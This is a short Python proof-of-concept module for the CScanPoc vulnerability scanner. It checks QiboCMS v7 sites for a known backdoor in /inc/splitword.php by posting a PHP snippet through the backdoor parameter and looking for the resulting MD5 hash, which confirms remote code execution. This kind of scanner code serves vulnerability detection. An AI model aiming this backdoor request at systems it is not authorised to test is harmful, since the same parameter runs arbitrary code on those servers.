# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib
import urllib2
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0000'  # 平台漏洞编号，留空
    name = 'QiboCMS v7 /inc/splitword.php 后门漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-11-03'  # 漏洞公布时间
    desc = '''
        QiboCMS v7 /inc/splitword.php 后门漏洞
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'v7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '68070a1b-6354-483a-88f3-6a0fae147f82'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/inc/splitword.php'
            verify_url = '{target}'.format(target=self.target)+payload

            req = urllib2.Request(
                verify_url, data="Y2hlbmdzaGlzLmMjd=echo md5('123');")
            content = urllib2.urlopen(req).read()
            if '202cb962ac59075b964b07152d234b70' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
